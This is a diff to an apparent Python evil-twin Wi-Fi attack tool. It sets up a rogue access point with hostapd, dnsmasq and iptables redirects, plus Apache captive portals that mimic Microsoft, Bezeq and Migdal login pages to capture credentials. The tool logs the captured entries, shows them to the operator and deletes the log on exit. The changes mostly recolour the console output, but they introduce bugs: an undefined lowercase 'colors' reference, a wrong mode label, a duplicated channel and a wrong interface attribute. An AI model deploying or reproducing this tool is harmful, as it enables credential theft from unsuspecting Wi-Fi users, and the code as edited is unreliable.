@@ -12,6 +12,17 @@ dnsmasq_proc = None
 hostapd_proc = None
 script_args = None
 
+class Colors:
+    RESET   = "\033[0m"
+    BOLD    = "\033[1m"
+    RED     = "\033[31m"
+    GREEN   = "\033[32m"
+    YELLOW  = "\033[33m"
+    BLUE    = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN    = "\033[36m"
+    WHITE   = "\033[37m"
+    DIM     = "\033[2m"
 
 CONNECT_RE    = re.compile(r'AP-STA-CONNECTED\s+([0-9a-f:]{17})', re.I)
 DISCONNECT_RE = re.compile(r'AP-STA-DISCONNECTED\s+([0-9a-f:]{17})', re.I)
@@ -27,7 +38,7 @@ def stream_hostapd_events(tag: str, proc: subprocess.Popen):
             if CONNECT_RE.search(s) or DISCONNECT_RE.search(s) or ASSOC_RE.search(s):
                 print(f"[hostapd:{tag}] {s}", flush=True)
     except Exception as e:
-        print(f"[-] hostapd stream error ({tag}): {e}")
+        print(f"{colors.RED}(>.<) hostapd stream error ({tag}): {e}{colors.RESET}")
 
 
 def run_command(command, suppress_output=True, ignore_errors=False):
@@ -38,63 +49,59 @@ def run_command(command, suppress_output=True, ignore_errors=False):
         return True
     except (subprocess.CalledProcessError, FileNotFoundError) as e:
         if not ignore_errors:
-            print(f"[-] Error executing command: {' '.join(command)}")
-            print(f"[-] Details: {e}")
+            print(f"{colors.RED}(>.<) Error executing command: {' '.join(command)}{colors.RESET}")
+            print(f"{colors.RED} Details: {e}{colors.RESET}")
         return False
     
 #####################################################################3
 
 def check_root():
     if os.geteuid() != 0:
-        print("[-] This script must be run as root. Please use 'sudo'.")
+        print(f"{colors.YELLOW}(>.<) This Tool must be run as root!{colors.RESET}")
         sys.exit(1)
-    print("[+] Root privileges confirmed.")
+    print(f"{colors.GREEN}(^.^) Running with Root privileges :){colors.RESET}")
 
 #####################################################################
 
 def check_dependencies():
     dependencies = ['apache2', 'php', 'hostapd', 'dnsmasq']
-    print("[*] Checking for required packages...")
     missing = []
     for dep in dependencies:
         if subprocess.call(['dpkg-query', '-W', '-f=${Status}', dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
             missing.append(dep)
 
     if missing:
-        print("[-] The following required packages are not installed:")
+        print(f"{colors.YELLOW}(@.@) The following required packages are not installed:{colors.RESET}")
         for pkg in missing:
             print(f"  - {pkg}")
-        print("[-] Please install them manually before running this script.")
-        print("[-] Example: sudo apt update && sudo apt install -y " + " ".join(missing))
+        print("Please install them manually before running this script.")
+        print("Example: sudo apt update && sudo apt install -y " + " ".join(missing))
         sys.exit(1)
-    print("[+] All dependencies are installed.")
+    print(f"{colors.GREEN}(^.^) All dependencies are installed.{colors.RESET}")
 
 #####################################################################
 
 def manage_service(service_name, action='stop'):
     service_cmd = ['systemctl', action, service_name]
-    print(f"[*] Attempting to {action} {service_name}...")
     run_command(service_cmd, ignore_errors=True)
-    print(f"[+] {service_name} {action} command issued.")
+    print(f"{colors.GREEN}(^.^) {service_name} {action} command issued.{colors.RESET}")
 
 #####################################################################
 
 def toggle_ip_forwarding(enable=True):
     action = "Enabling" if enable else "Disabling"
     value = "1" if enable else "0"
-    print(f"[*] {action} IP forwarding...")
     try:
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
             f.write(value)
         return True
     except IOError as e:
-        print(f"[-] Failed to {action.lower()} IP forwarding: {e}")
+        print(f"{colors.RED}(>.<) Failed to {action.lower()} IP forwarding: {e}{colors.RESET}")
         return False
 
 #####################################################################
 
 def configure_interface(iface, network_str):
-    print(f"[*] Configuring interface {iface}...")
     try:
         network = ipaddress.ip_network(network_str)
         ip_addr = str(next(network.hosts()))
@@ -108,12 +115,12 @@ def configure_interface(iface, network_str):
         
         for cmd in commands:
             if not run_command(cmd):
-                raise Exception(f"Failed to execute: {' '.join(cmd)}")
+                raise Exception(f"{colors.RED}(>.<) Failed to execute: {' '.join(cmd)}{colors.RESET}")
                 
-        print(f"[+] Interface {iface} configured with IP {ip_addr}")
+        print(f"{colors.GREEN}(^.^) Interface {iface} configured with IP {ip_addr}{colors.RESET}")
         return ip_addr
     except Exception as e:
-        print(f"[-] Failed to configure interface: {e}")
+        print(f"(>.<) {colors.RED}[-] Failed to configure interface: {e}{colors.RESET}")
         sys.exit(1)
 
 
@@ -121,7 +128,6 @@ def configure_interface(iface, network_str):
 #####################################################################
 
 def create_dnsmasq_conf(iface, ip_addr, network_str):
-    print("[*] Creating dnsmasq.conf...")
     try:
         network = ipaddress.ip_network(network_str)
         dhcp_start = str(network.network_address + 10)
@@ -142,15 +148,14 @@ address=/connectivitycheck.gstatic.com/{ip_addr}
 """
         with open("dnsmasq.conf", "w") as f:
             f.write(config_content.strip())
-        print("[+] dnsmasq.conf created successfully.")
+        print(f"{colors.GREEN}(^.^) dnsmasq.conf created successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create dnsmasq.conf: {e}")
+        print(f"{colors.RED}(>.<) Failed to create dnsmasq.conf: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def create_dnsmasq_conf_dual(iface1, iface2, ip_addr, network_str):
-    print("[*] Creating dnsmasq_dual.conf...")
     try:
         network = ipaddress.ip_network(network_str)
         dhcp_start = str(network.network_address + 10)
@@ -175,14 +180,13 @@ address=/connectivitycheck.gstatic.com/{ip_addr}
 """
         with open("dnsmasq_dual.conf", "w") as f:
             f.write(config_content.strip())
-        print("[+] dnsmasq_dual.conf created successfully.")
+        print(f"{colors.GREEN}(^.^) DNS configuration file created successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create dnsmasq.conf: {e}")
+        print(f"{colors.RED}(>.<) Failed to create dnsmasq.conf: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 def create_hostapd_conf2_4(iface, ssid, channel):
-    print("[*] Creating hostapd_24.conf...")
     config_content = f"""
 interface={iface}
 driver=nl80211
@@ -195,15 +199,14 @@ wmm_enabled=0
     try:
         with open("hostapd_24.conf", "w") as f:
             f.write(config_content.strip())
-        print("[+] hostapd_24.conf created successfully.")
+        print(f"{colors.GREEN}(^.^) HotSpot 2.4GHz Configuration file created successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create hostapd.conf: {e}")
+        print(f"{colors.RED}(>.<) Failed to create hostapd.conf: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def create_hostapd_conf5(iface, ssid, channel):
-    print("[*] Creating hostapd_5.conf...")
     config_content = f"""
 interface={iface}
 driver=nl80211
@@ -216,15 +219,14 @@ wmm_enabled=1
     try:
         with open("hostapd_5.conf", "w") as f:
             f.write(config_content.strip())
-        print("[+] hostapd_5.conf created successfully.")
+        print(f"{colors.GREEN}(^.^) HotSpot 5GHz Configuration file created successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create hostapd.conf: {e}")
+        print(f"{colors.RED}(>.<) Failed to create hostapd.conf: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def setup_apache():
-    print("[*] Setting up Apache2...")
     commands = [
         ['systemctl', 'start', 'apache2'],
         ['a2enmod', 'rewrite'],
@@ -233,24 +235,20 @@ def setup_apache():
     ]
     for cmd in commands:
         if not run_command(cmd):
-            print(f"[-] Failed to configure Apache. Aborting.")
+            print(f"{colors.RED}(>.<) Failed to configure Apache...{colors.RESET}")
             sys.exit(1)
-    print("[+] Apache2 configured and started.")
+    print(f"{colors.GREEN}(^.^) Apache2 Server started successfully.{colors.RESET}")
 
 #####################################################################
 
 def setup_captive_portal_files(Cap: str):
     portal_dir = "/var/www/captive"
-    print(f"[*] Setting up captive portal files in {portal_dir}...")
-    
-        
+          
     if not os.path.exists(portal_dir):
-        print(f"[*] Directory {portal_dir} not found. Creating...")
         if not run_command(['mkdir', '-p', portal_dir]):
             sys.exit(1)
     
     try:
-        print("[*] Copying portal files...")
         if Cap == "default":
             shutil.copy("Default/index.html", os.path.join(portal_dir, "index.html"))
             shutil.copy("Default/save.php", os.path.join(portal_dir, "save.php"))
@@ -273,24 +271,21 @@ def setup_captive_portal_files(Cap: str):
             shutil.copy("Migdal/password.php", os.path.join(portal_dir, "password.php"))
             shutil.copy("Migdal/logo.svg", os.path.join(portal_dir, "logo.svg"))
         
-        print("[+] Captive portal files copied successfully.")
+        print(f"{colors.GREEN}(^.^) Captive portal files copied successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to copy portal files: {e}")
+        print(f"{colors.RED}(>.<) Failed to copy portal files: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def setup_captive_portal_files_dual(Cap: str):
     portal_dir = "/var/www/captive_dual"
-    print(f"[*] Setting up captive portal files in {portal_dir}...")
     
     if not os.path.exists(portal_dir):
-        print(f"[*] Directory {portal_dir} not found. Creating...")
         if not run_command(['mkdir', '-p', portal_dir]):
             sys.exit(1)
     
     try:
-        print("[*] Copying portal files...")
         if Cap == "default":
             shutil.copy("Default/Dual/index.html", os.path.join(portal_dir, "index.html"))
             shutil.copy("Default/Dual/save.php", os.path.join(portal_dir, "save.php"))
@@ -313,15 +308,14 @@ def setup_captive_portal_files_dual(Cap: str):
             shutil.copy("Migdal/Dual/password.php", os.path.join(portal_dir, "password.php"))
             shutil.copy("Migdal/Dual/logo.svg", os.path.join(portal_dir, "logo.svg"))
         
-        print("[+] Captive portal files copied successfully.")
+        print(f"{colors.GREEN}(^.^) Captive portal files copied successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to copy portal files: {e}")
+        print(f"{colors.RED}(>.<) Failed to copy portal files: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 def setup_log_file():
     log_file = "/var/log/ca.log"
-    print(f"[*] Setting up log file {log_file}...")
     try:
         if not os.path.exists(log_file):
             run_command(['touch', log_file])
@@ -331,16 +325,15 @@ def setup_log_file():
         
         os.chown(log_file, www_data_uid, www_data_gid)
         os.chmod(log_file, 0o640)
-        print("[+] Log file permissions set correctly.")
+        print(f"{colors.GREEN}(^.^) Log file created successfull (It will removed automatically).{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to set up log file: {e}")
+        print(f"{colors.RED}(>.<) Failed to set up log file: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def setup_log_file_dual():
     log_file = "/var/log/ca2.log"
-    print(f"[*] Setting up log file {log_file}...")
     try:
         if not os.path.exists(log_file):
             run_command(['touch', log_file])
@@ -350,16 +343,15 @@ def setup_log_file_dual():
         
         os.chown(log_file, www_data_uid, www_data_gid)
         os.chmod(log_file, 0o640)
-        print("[+] Log file permissions set correctly.")
+        print(f"{colors.GREEN}(^.^) Log file created successfull (It will removed automatically).{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to set up log file: {e}")
+        print(f"{colors.RED}(>.<) Failed to set up log file: {e}{colors.RESET}")
         sys.exit(1)
         
 #####################################################################
 
 def create_vhost():
     vhost_file = "/etc/apache2/sites-available/captive.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -384,15 +376,14 @@ def create_vhost():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 def create_vhost_dual():
     vhost_file = "/etc/apache2/sites-available/captive2.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -417,16 +408,15 @@ def create_vhost_dual():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def create_vhost_microsoft():
     vhost_file = "/etc/apache2/sites-available/captive.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -464,16 +454,15 @@ def create_vhost_microsoft():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def create_vhost_microsoft_dual():
     vhost_file = "/etc/apache2/sites-available/captive2.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -511,16 +500,15 @@ def create_vhost_microsoft_dual():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def create_vhost_migdal_dual():
     vhost_file = "/etc/apache2/sites-available/captive2.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -558,9 +546,9 @@ def create_vhost_migdal_dual():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
 
 
@@ -568,7 +556,6 @@ def create_vhost_migdal_dual():
 
 def create_vhost_migdal():
     vhost_file = "/etc/apache2/sites-available/captive.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -606,16 +593,15 @@ def create_vhost_migdal():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def create_vhost_bezeq():
     vhost_file = "/etc/apache2/sites-available/captive.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -661,16 +647,15 @@ def create_vhost_bezeq():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
 
 #####################################################################
 
 def create_vhost_bezeq_dual():
     vhost_file = "/etc/apache2/sites-available/captive2.conf"
-    print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
 <VirtualHost *:80>
@@ -715,14 +700,13 @@ def create_vhost_bezeq_dual():
     try:
         with open(vhost_file, "w") as f:
             f.write(vhost_content.strip())
-        print("[+] VirtualHost file created.")
+        print(f"{colors.GREEN}(^.^) VHost Created Successfully.{colors.RESET}")
     except Exception as e:
-        print(f"[-] Failed to create VirtualHost file: {e}")
+        print(f"{colors.RED}(>.<) Failed to create VirtualHost file: {e}{colors.RESET}")
         sys.exit(1)
         
 #####################################################################
 def enable_apache_site():
-    print("[*] Enabling captive portal Apache site...")
     commands = [
         ['a2ensite', 'captive.conf'],
         ['a2dissite', '000-default.conf'],
@@ -730,14 +714,12 @@ def enable_apache_site():
     ]
     for cmd in commands:
         if not run_command(cmd):
-            print("[-] Failed to enable Apache site. Aborting.")
+            print(f"{colors.RED}(>.<) Failed to enable Apache site.{colors.RESET}")
             sys.exit(1)
-    print("[+] Apache site enabled.")
 
 #####################################################################
 
 def enable_apache_site_dual():
-    print("[*] Enabling captive portal Apache site...")
     commands = [
         ['a2ensite', 'captive.conf'],
         ['a2ensite', 'captive2.conf'],
@@ -746,15 +728,13 @@ def enable_apache_site_dual():
     ]
     for cmd in commands:
         if not run_command(cmd):
-            print("[-] Failed to enable Apache site. Aborting.")
+            print(f"{colors.RED}(>.<) Failed to enable Apache site.{colors.RESET}")
             sys.exit(1)
-    print("[+] Apache site enabled.")
 
 
 #####################################################################
 
 def setup_iptables(iface):
-    print("[*] Setting up iptables rules...")
     commands = [
         ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
         ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
@@ -762,29 +742,26 @@ def setup_iptables(iface):
     ]
     for cmd in commands:
         if not run_command(cmd):
-            print("[-] Failed to set up iptables. Aborting.")
+            print(f"{colors.RED}(>.<) Failed to set up iptables.{colors.RESET}")
             cleanup(0, 0)
             sys.exit(1)
-    print("[+] Iptables rules configured.")
+    print(f"{colors.GREEN}(^.^) IPtables rules configured successfully.{colors.RESET}")
 
 #####################################################################
 
 def start_attack():
     global dnsmasq_proc, hostapd_proc
-    print("[*] Starting the attack...")
 
     subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
 
     try:
-        print("[*] Starting dnsmasq...")
         dnsmasq_proc = subprocess.Popen(
             ['dnsmasq', '-C', 'dnsmasq.conf', '-d'],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, bufsize=1
         )
 
-        print("[*] Starting hostapd...")
         hostapd_conf = 'hostapd_5.conf' if script_args.band == "5" else 'hostapd_24.conf'
         hostapd_proc = subprocess.Popen(
             ['hostapd', hostapd_conf],
@@ -796,13 +773,13 @@ def start_attack():
 
         if dnsmasq_proc.poll() is not None:
             out = dnsmasq_proc.stdout.read() if dnsmasq_proc.stdout else ""
-            print("[-] dnsmasq failed to start. Error output:")
+            print(f"{colors.RED}(>.<) dnsmasq failed to start. Error output:{colors.RESET}")
             print((out or "").strip())
             raise Exception("dnsmasq failed.")
 
         if hostapd_proc.poll() is not None:
             out = hostapd_proc.stdout.read() if hostapd_proc.stdout else ""
-            print("[-] hostapd failed to start. Error output:")
+            print(f"{colors.RED}(>.<) hostapd failed to start. Error output:{colors.RESET}")
             print((out or "").strip())
             raise Exception("hostapd failed.")
 
@@ -812,9 +789,10 @@ def start_attack():
             daemon=True
         ).start()
 
-        print("\n[+] EVIL TWIN IS RUNNING!")
-        print(f"[+] SSID: {script_args.ssid} on Channel: {script_args.channel}")
-        print("[+] Press CTRL+C to stop the attack and clean up.")
+        print(f"{colors.CYAN}\n[+] EVIL TWIN IS RUNNING on single mode XD{colors.RESET}")
+        print(f"[+] SSID:{colors.YELLOW}{colors.BOLD}{script_args.ssid}{colors.RESET} , On Channel: {colors.YELLOW}{colors.BOLD}{script_args.channel}{colors.RESET}")
+        print(f" {colors.MAGENTA}Press CTRL+C to stop and clean up.{colors.RESET}")
+        print(f" {colors.MAGENTA}========================================={colors.RESET}")
 
     except Exception:
         print("[-] Failed to start attack processes.")
@@ -828,20 +806,17 @@ def start_attack():
 def start_attack_dual(channel1: str, channel2: str):
     global dnsmasq_proc, hostapd_procs
     hostapd_procs = []
-    print("[*] Starting the attack...")
 
     subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
 
     try:
-        print("[*] Starting dnsmasq...")
         dnsmasq_proc = subprocess.Popen(
             ['dnsmasq', '-C', 'dnsmasq_dual.conf', '-d'],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, bufsize=1
         )
 
-        print("[*] Starting hostapd...")
         p1 = subprocess.Popen(
             ['hostapd', 'hostapd_24.conf'],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
@@ -867,9 +842,10 @@ def start_attack_dual(channel1: str, channel2: str):
         threading.Thread(target=stream_hostapd_events,
                          args=(script_args.iface2, p2), daemon=True).start()
 
-        print("\n[+] EVIL TWIN IS RUNNING!")
-        print(f"[+] SSID: {script_args.ssid} on Channel: {channel1} and Channel {channel2}")
-        print("[+] Press CTRL+C to stop the attack and clean up.")
+        print(f"{colors.CYAN}\n[+] EVIL TWIN IS RUNNING on single mode XD{colors.RESET}")
+        print(f"[+] SSID:{colors.YELLOW}{colors.BOLD}{script_args.ssid}{colors.RESET} , On Channel: {colors.YELLOW}{colors.BOLD}{script_args.channel1}{colors.RESET} and Channel  {colors.YELLOW}{colors.BOLD}{script_args.channel1}{colors.RESET}")
+        print(f" {colors.MAGENTA}Press CTRL+C to stop and clean up.{colors.RESET}")
+        print(f" {colors.MAGENTA}========================================={colors.RESET}")
 
     except Exception:
         print("[-] Failed to start attack processes.")
@@ -880,20 +856,20 @@ def start_attack_dual(channel1: str, channel2: str):
 #####################################################################
 
 def cleanup_dual(signum, frame):
-    print("\n\n[*] CTRL+C detected. Cleaning up...")
+    print(f"{colors.DIM}\n\n[*] CTRL+C detected. Cleaning up...{colors.RESET}")
     
     if dnsmasq_proc:
         dnsmasq_proc.terminate()
-        print("[*] Terminated dnsmasq.")
+        print(f"{colors.DIM}(#.#) Terminated DNS Server...{colors.RESET}")
     run_command(['pkill', 'dnsmasq'], ignore_errors=True)
     if hostapd_proc:
         hostapd_proc.terminate()
-        print("[*] Terminated hostapd.")
+        print(f"{colors.DIM}(#.#) Terminated HotSpot...{colors.RESET}")
     run_command(['pkill', 'hostapd'], ignore_errors=True)
 
 
     if script_args.iface1:
-        print("[*] Removing iptables rules...")
+        print(f"{colors.DIM}(#.#) Cleaning IPtables rules...{colors.RESET}")
         rules = [
             ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface1, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
             ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface1, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
@@ -905,12 +881,11 @@ def cleanup_dual(signum, frame):
     toggle_ip_forwarding(enable=False)
 
     if script_args.iface1:
-        print(f"[*] Flushing IP from {script_args.iface1}...")
+        print(f"{colors.DIM}(#.#) Flushing IP from {script_args.iface1} {colors.RESET}")
         run_command(['ip', 'addr', 'flush', 'dev', script_args.iface1], ignore_errors=True)
     
 
     if script_args.iface2:
-        print("[*] Removing iptables rules...")
         rules = [
             ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface2, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
             ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface2, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
@@ -922,7 +897,7 @@ def cleanup_dual(signum, frame):
     toggle_ip_forwarding(enable=False)
 
     if script_args.iface2:
-        print(f"[*] Flushing IP from {script_args.iface2}...")
+        print(f"{colors.DIM}(#.#) Flushing IP from {script_args.iface2} {colors.RESET}")
         run_command(['ip', 'addr', 'flush', 'dev', script_args.iface2], ignore_errors=True)
 
     manage_service('systemd-resolved', 'start')
@@ -930,42 +905,45 @@ def cleanup_dual(signum, frame):
 
     log_file = "/var/log/ca.log"
     if os.path.exists(log_file):
-        print(f"[*] Displaying contents of {log_file}:")
+        print(f"[@.@] Displaying contents of {log_file}:")
+        print(f"{colors.DIM}------------------------------------:{colors.RESET}")
         try:
             with open(log_file, "r") as f:
                 content = f.read().strip()
                 if content:
                     print("-" * 40)
-                    print(content)
+                    print(f"{colors.YELLOW}{content}{colors.RESET}")
                     print("-" * 40)
                 else:
                     print("[*] Log file is empty.")
         except Exception as e:
             print(f"[-] Could not read log file: {e}")
-        
-        print(f"[*] Removing {log_file}...")
+        print(f"{colors.DIM}------------------------------------:{colors.RESET}")
+        print(" ")
+        print(f"{colors.DIM}(#.#) Removing Log file form {log_file} {colors.RESET}")
         os.remove(log_file)
     
     log_file2 = "/var/log/ca2.log"
     if os.path.exists(log_file2):
-        print(f"[*] Displaying contents of {log_file2}:")
+        print(f"[@.@] Displaying contents of {log_file}:")
+        print(f"{colors.DIM}------------------------------------:{colors.RESET}")
         try:
             with open(log_file2, "r") as f:
                 content = f.read().strip()
                 if content:
                     print("-" * 40)
-                    print(content)
+                    print(f"{colors.YELLOW}{content}{colors.RESET}")
                     print("-" * 40)
                 else:
                     print("[*] Log file is empty.")
         except Exception as e:
             print(f"[-] Could not read log file: {e}")
         
-        print(f"[*] Removing {log_file2}...")
+        print(f"{colors.DIM}------------------------------------:{colors.RESET}")
+        print(f"{colors.DIM}(#.#) Removing Log file form {log_file2} {colors.RESET}")
         os.remove(log_file2)
 
-
-    print("[*] Stopping Apache2 and cleaning configuration...")
+    print(f"{colors.DIM}(#.#) Stopping Apache2 and cleaning configuration... {colors.RESET}")
     run_command(['systemctl', 'stop', 'apache2'], ignore_errors=True)
     run_command(['a2dissite', 'captive.conf'], ignore_errors=True)
     run_command(['a2dissite', 'captive2.conf'], ignore_errors=True)
@@ -979,12 +957,12 @@ def cleanup_dual(signum, frame):
 
     portal_dir = "/var/www/captive"
     if os.path.exists(portal_dir):
-        print(f"[*] Removing directory {portal_dir}...")
+        print(f"{colors.DIM}(#.#) Removing directory {portal_dir}... {colors.RESET}")
         shutil.rmtree(portal_dir)
     
     portal_dir2 = "/var/www/captive_dual"
     if os.path.exists(portal_dir2):
-        print(f"[*] Removing directory {portal_dir2}...")
+        print(f"{colors.DIM}(#.#) Removing directory {portal_dir2}... {colors.RESET}")
         shutil.rmtree(portal_dir2)
 
     if os.path.exists("dnsmasq_dual.conf"):
@@ -994,25 +972,25 @@ def cleanup_dual(signum, frame):
     if os.path.exists("hostapd_5.conf"):
         os.remove("hostapd_5.conf")   
 
-    print("[+] Cleanup complete. Exiting.")
+    print(f"{colors.DIM}NICE DAY! {colors.RESET}")
     sys.exit(0)
 #############################################################################
 
 def cleanup(signum, frame):
-    print("\n\n[*] CTRL+C detected. Cleaning up...")
+    print(f"{colors.DIM}\n\n[*] CTRL+C detected. Cleaning up...{colors.RESET}")
     
     if dnsmasq_proc:
         dnsmasq_proc.terminate()
-        print("[*] Terminated dnsmasq.")
+        print(f"{colors.DIM}(#.#) Terminated DNS Server...{colors.RESET}")
     run_command(['pkill', 'dnsmasq'], ignore_errors=True)
     if hostapd_proc:
         hostapd_proc.terminate()
-        print("[*] Terminated hostapd.")
+        print(f"{colors.DIM}(#.#) Terminated HotSpot...{colors.RESET}")
     run_command(['pkill', 'hostapd'], ignore_errors=True)
 
 
-    if script_args:
-        print("[*] Removing iptables rules...")
+    if script_args.iface:
+        print(f"{colors.DIM}(#.#) Cleaning IPtables rules...{colors.RESET}")
         rules = [
             ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
             ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
@@ -1024,7 +1002,7 @@ def cleanup(signum, frame):
     toggle_ip_forwarding(enable=False)
 
     if script_args.iface:
-        print(f"[*] Flushing IP from {script_args.iface}...")
+        print(f"{colors.DIM}(#.#) Flushing IP from {script_args.iface1} {colors.RESET}")
         run_command(['ip', 'addr', 'flush', 'dev', script_args.iface], ignore_errors=True)
     
 
@@ -1033,24 +1011,25 @@ def cleanup(signum, frame):
 
     log_file = "/var/log/ca.log"
     if os.path.exists(log_file):
-        print(f"[*] Displaying contents of {log_file}:")
+        print(f"[@.@] Displaying contents of {log_file}:")
+        print(f"{colors.DIM}------------------------------------:{colors.RESET}")
         try:
             with open(log_file, "r") as f:
                 content = f.read().strip()
                 if content:
                     print("-" * 40)
-                    print(content)
+                    print(f"{colors.YELLOW}{content}{colors.RESET}")
                     print("-" * 40)
                 else:
                     print("[*] Log file is empty.")
         except Exception as e:
             print(f"[-] Could not read log file: {e}")
         
-        print(f"[*] Removing {log_file}...")
+        print(f"{colors.DIM}(#.#) Removing Log file form {log_file} {colors.RESET}")
         os.remove(log_file)
     
 
-    print("[*] Stopping Apache2 and cleaning configuration...")
+    print(f"{colors.DIM}(#.#) Stopping Apache2 and cleaning configuration... {colors.RESET}")
     run_command(['systemctl', 'stop', 'apache2'], ignore_errors=True)
     run_command(['a2dissite', 'captive.conf'], ignore_errors=True)
     run_command(['a2ensite', '000-default.conf'], ignore_errors=True)
@@ -1062,7 +1041,7 @@ def cleanup(signum, frame):
 
     portal_dir = "/var/www/captive"
     if os.path.exists(portal_dir):
-        print(f"[*] Removing directory {portal_dir}...")
+        print(f"{colors.DIM}(#.#) Removing directory {portal_dir}... {colors.RESET}")
         shutil.rmtree(portal_dir)
     
 
@@ -1071,50 +1050,111 @@ def cleanup(signum, frame):
     if os.path.exists("hostapd.conf"):
         os.remove("hostapd_24.conf")
 
-    print("[+] Cleanup complete. Exiting.")
+    print(f"{colors.DIM}NICE DAY! {colors.RESET}")
